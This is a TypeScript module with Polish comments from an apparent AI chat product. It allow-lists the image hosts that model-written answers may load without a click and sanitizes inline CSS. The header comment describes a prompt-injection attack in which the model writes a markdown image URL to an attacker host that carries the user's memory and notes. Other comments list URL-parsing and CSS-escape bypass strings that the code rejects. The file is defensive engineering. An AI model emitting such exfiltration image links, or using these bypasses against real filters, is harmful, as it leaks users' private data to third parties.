/**
 * ════════════════════════════════════════════════════════════════════════
 *  OBRAZY W TREŚCI MODELU — co wolno wczytać bez kliknięcia (01.10.2026)
 * ════════════════════════════════════════════════════════════════════════
 *
 * Treść odpowiedzi pisze model, więc model składa też adres każdego obrazka.
 * Po wstrzyknięciu poleceń (wynik wyszukiwania, strona, plik) wystarczy, że
 * dopisze `![x](https://atak/p.png?d=<pamięć, notatki>)` — przeglądarka
 * pobiera obraz przy rysowaniu odpowiedzi, BEZ kliknięcia, a dane jadą
 * w adresie do cudzego serwera. Odpowiedź leży w bazie, więc żądanie wraca
 * przy każdym otwarciu rozmowy (recenzja `otworz_strone`, punkt M2).
 *
 * Zasada: obraz z treści modelu wczytuje się sam tylko z hostów poniżej.
 * Każdy inny dostaje przycisk „Pokaż obraz z domena.pl” i nie wysyła
 * żadnego żądania, dopóki człowiek nie kliknie.
 *
 * ── SKĄD TA LISTA (SELECT na produkcji, 01.10.2026) ─────────────────────
 * `user_chat_history`, cała historia (6 287 odpowiedzi bota, od 07.2025),
 * obrazy w treści (markdown, `<img>`, goły adres .png/.jpg/.gif/.webp):
 *   • przyklad-projektu.supabase.co — 11 odpowiedzi (08.2026, obraz
 *     pokazu lejka z `site-assets`); JEDYNY host z ostatnich 90 dni,
 *   • obce, wszystkie sprzed 90 dni (26 odpowiedzi, 11.2025–06.2026):
 *     api.infip.pro 13 i oaidalleapiprodscus.blob.core.windows.net 2 (dawne
 *     generatory, w kodzie już ich nie ma), image.pollinations.ai 4 (prompt
 *     w adresie — dokładnie ten kanał), storage.googleapis.com 1,
 *     miro.medium.com 1, i.imgur.com 1, example.com 1, ścieżka względna 1,
 *     zaślepki 2 → przycisk (zaślepki i `javascript:` — sam opis).
 * Dane serwera (90 dni: metadane generacji 26, załączniki 352) — wyłącznie
 * nasz Storage; wizualizacje — `data:image/jpeg`. `nextbyte.space` w treści
 * bota nie wystąpił ani razu, ale to nasza aplikacja (zasoby statyczne).
 *
 * ── CZEGO TU CELOWO NIE MA ──────────────────────────────────────────────
 * • Subdomen `*.nextbyte.space` — portale firm (`<slug>.nextbyte.space`)
 *   prowadzi kto inny niż my; zaufanie do całej strefy to zaufanie do nich.
 * • Reszty hosta Supabase (`/rest`, `/functions`, `/auth`) — obraz może
 *   pochodzić tylko ze Storage, a nie z dowolnego punktu API.
 * • `http:` i innych portów niż domyślny.
 */
import { PROMIEN_PRZYCISKU, RDZEN_STYL_2 } from '@/components/ui/style-przyciskow';

/** Projekt Supabase produkcji — ten sam co `SUPABASE_URL` w integracji klienta. */
const HOST_STORAGE = 'przyklad-projektu.supabase.co';

/** Ścieżki Storage (publiczne, podpisane, transformacje obrazów). Reszta hosta to API. */
const SCIEZKI_STORAGE = [
  '/storage/v1/object/public/',
  '/storage/v1/object/sign/',
  '/storage/v1/render/image/public/',
  '/storage/v1/render/image/sign/',
] as const;

/** Nasza aplikacja — tylko te dwa hosty, bez subdomen. */
const HOSTY_APLIKACJI = new Set(['nextbyte.space', 'www.nextbyte.space']);

/** `data:image/<typ>` — obraz zaszyty w treści, bez żadnego żądania. */
const DATA_OBRAZ = /^data:image\/[a-z0-9.+-]+[;,]/i;

export interface OcenaObrazu {
  /** `true` → `<img>` może wczytać się sam. */
  dozwolony: boolean;
  /** Domena do napisu przycisku (`hostname` z `new URL`), `null` gdy jej nie ma. */
  domena: string | null;
}

/** Domena do pokazania człowiekowi — także dla adresu względnego (względem strony). */
function domenaDoNapisu(adres: string): string | null {
  try {
    const baza = typeof window !== 'undefined' ? window.location.href : 'https://nextbyte.space/';
    const u = new URL(adres, baza);
    if (u.protocol !== 'http:' && u.protocol !== 'https:') return null;
    return u.hostname.replace(/^www\./, '') || null;
  } catch {
    return null;
  }
}

/**
 * Czy obraz z treści modelu wolno wczytać bez kliknięcia.
 *
 * Dopasowanie po `hostname` z parsera WHATWG — tego samego, którym przeglądarka
 * rozwiąże `src`. Dzięki temu nie przechodzą obejścia tekstowe:
 * `nextbyte.space.atak.com`, `atak.com/?x=nextbyte.space`, `nextbyte.space@atak.com`,
 * `atak.com\@nextbyte.space`, `//atak.com` (względny → odrzucony), `https:atak.com`.
 */
export function ocenObrazModelu(adres: unknown): OcenaObrazu {
  if (typeof adres !== 'string') return { dozwolony: false, domena: null };
  const s = adres.trim();
  if (!s) return { dozwolony: false, domena: null };

  if (/^data:/i.test(s)) return { dozwolony: DATA_OBRAZ.test(s), domena: null };

  let u: URL;
  try {
    // BEZ bazy: adres względny i `//host` rzucają, czyli trafiają do przycisku.
    u = new URL(s);
  } catch {
    return { dozwolony: false, domena: domenaDoNapisu(s) };
  }

  // `blob:` żyje w pamięci przeglądarki tej karty — nie ma czego wysłać.
  if (u.protocol === 'blob:') return { dozwolony: true, domena: null };

  const domena = u.protocol === 'https:' || u.protocol === 'http:' ? u.hostname.replace(/^www\./, '') || null : null;
  if (u.protocol !== 'https:' || u.username || u.password || u.port) return { dozwolony: false, domena };

  const host = u.hostname;
  if (host === HOST_STORAGE) {
    return { dozwolony: SCIEZKI_STORAGE.some((p) => u.pathname.startsWith(p)), domena };
  }
  return { dozwolony: HOSTY_APLIKACJI.has(host), domena };
}

export const czyObrazModeluDozwolony = (adres: unknown): boolean => ocenObrazModelu(adres).dozwolony;

/** Jedno zdanie na przycisku — bez dopowiedzeń (zasada „bez zapychających tekstów”). */
export const napisPrzyciskuObrazu = (domena: string | null): string =>
  domena ? `Pokaż obraz z ${domena}` : 'Pokaż obraz';

/**
 * Atrybut, w którym zastępnik trzyma adres obrazu. Treść modelu NIE może go
 * ustawić sama (sanitizer go zdejmuje) — inaczej model podrobiłby przycisk
 * „Pokaż obraz z nextbyte.space” z obcym adresem w środku.
 */
export const ATRYBUT_ADRESU_OBRAZU = 'data-nb-obraz';
export const ATRYBUT_OPISU_OBRAZU = 'data-nb-obraz-alt';
export const KLASA_ZASTEPNIKA_OBRAZU = 'nb-obraz-zastepnik';

/**
 * Wygląd przycisku w treści odpowiedzi: STYL 2 biblioteki (`nb-obwodka` —
 * obwódka + szkło, `style-przyciskow.ts`) w geometrii `Button size="akcja"`.
 * Te same klasy dostaje przycisk w HTML-u odpowiedzi (sanitizer), w Reakcie
 * (`ObrazZaKliknieciem`) i „Pokaż diagram” w bloku Mermaid.
 */
export const KLASY_PRZYCISKU_TRESCI = [
  'inline-flex max-w-full items-center gap-1.5 h-8 px-3 my-1 align-middle',
  'border',
  RDZEN_STYL_2,
  PROMIEN_PRZYCISKU,
  'text-przycisk transition-colors duration-200 cursor-pointer',
  'ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2',
  '[&_svg]:pointer-events-none [&_svg]:size-3.5 [&_svg]:shrink-0 [&_svg]:opacity-70',
].join(' ');

/** Przycisk zastępnika obrazu = przycisk w treści + znacznik, po którym łapie go `odslonObrazModelu`. */
export const KLASY_PRZYCISKU_OBRAZU = `${KLASA_ZASTEPNIKA_OBRAZU} ${KLASY_PRZYCISKU_TRESCI}`;

/** Ikona `Image` z lucide (te same ścieżki), do przycisku w HTML-u odpowiedzi. */
export const IKONA_OBRAZU_SVG =
  '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="18" height="18" x="3" y="3" rx="2" ry="2"/><circle cx="9" cy="9" r="2"/><path d="m21 15-3.086-3.086a2 2 0 0 0-2.828 0L6 21"/></svg>';

/** Klasy obrazu po odsłonięciu — te same, które formatter daje obrazom z listy. */
export const KLASY_ODSLONIETEGO_OBRAZU = 'nextbyte-md-image my-2 max-w-full rounded-xl border border-border/60';

/* ── STYL W TREŚCI MODELU ──────────────────────────────────────────────── */

/** Funkcje CSS, które nie sięgają do sieci (kolory formattera `{color:rgb(…)}`, `calc`). */
const FUNKCJE_STYLU = new Set(['rgb', 'rgba', 'hsl', 'hsla', 'calc']);

/**
 * Czy wartość `style` (albo `fill`/`stroke` w SVG) z treści modelu nie może
 * niczego wczytać. Każde pobranie z CSS wymaga funkcji (`url()`, `image-set()`,
 * `image()`, `cross-fade()`…), a jedyną drogą do ukrycia jej nazwy są ucieczki
 * `\72` i komentarze — więc: żadnego `\`, `@`, `/*`, `<`, a funkcje tylko
 * z listy. KaTeX (wzory w odpowiedziach) używa samych długości bez funkcji,
 * więc ta reguła go nie dotyka — zmierzone na 25 wzorach, 01.10.2026.
 */
export function czyStylTresciModeluBezpieczny(wartosc: string): boolean {
  if (!wartosc) return true;
  if (/[\\@<>]|\/\*|expression|javascript|behavior|binding/i.test(wartosc)) return false;
  for (const m of wartosc.matchAll(/([a-z0-9_-]+)\s*\(/gi)) {
    if (!FUNKCJE_STYLU.has(m[1].toLowerCase())) return false;
  }
  return true;
}
